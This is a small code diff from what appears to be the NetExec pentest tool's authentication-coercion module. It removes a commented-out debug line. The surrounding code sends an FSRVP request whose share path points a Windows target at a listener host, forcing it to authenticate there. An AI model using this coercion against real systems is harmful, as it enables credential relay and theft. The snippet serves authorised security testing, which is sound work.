@@ -253,7 +253,6 @@ class CoerceAuth:
             # only NETLOGON and SYSVOL were detected working here
             # setting the share to something else raises a 0x80042308 (FSRVP_E_OBJECT_NOT_FOUND) or 0x8004230c (FSRVP_E_NOT_SUPPORTED)
             request["ShareName"] = f"\\\\{listener}\\NETLOGON\x00"
-            # request.dump()
             dce.request(request)
         except Exception as e:
             nxc_logger.debug("Something went wrong, check error status => %s", str(e))
